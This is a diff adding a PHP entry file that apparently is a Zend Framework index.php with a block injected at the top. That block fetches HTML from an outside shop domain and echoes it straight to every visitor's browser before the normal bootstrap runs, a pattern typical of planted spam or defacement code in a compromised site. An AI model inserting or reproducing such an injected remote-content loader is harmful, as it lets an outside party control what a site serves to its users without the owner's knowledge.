@@ -1,0 +1,50 @@
+<?php
+function get_raw_html($url) {
+    if (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP script)');
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    } else {
+        return "<p>ERROR: Tidak bisa mengambil konten dari URL.</p>";
+    }
+}
+
+// Ganti URL di bawah dengan file raw HTML kamu
+$url = "https://anesiaolong.shop/input.txt";
+
+// Output HTML langsung ke browser
+echo get_raw_html($url);
+?>
+<?php
+
+// Define path to application directory
+defined('APPLICATION_PATH')
+    //|| define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/../application'));
+	|| define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/application'));
+
+// Define application environment
+defined('APPLICATION_ENV')
+    || define('APPLICATION_ENV', (getenv('APPLICATION_ENV') ? getenv('APPLICATION_ENV') : 'production'));
+
+// Ensure library/ is on include_path
+set_include_path(implode(PATH_SEPARATOR, array(
+    realpath(APPLICATION_PATH . '/../library'),
+    get_include_path(),
+)));
+
+/** Zend_Application */
+require_once 'Zend/Application.php';
+
+// Create application, bootstrap, and run
+$application = new Zend_Application(
+    APPLICATION_ENV,
+    APPLICATION_PATH . '/configs/application.ini'
+);
+$application->bootstrap()
+            ->run();
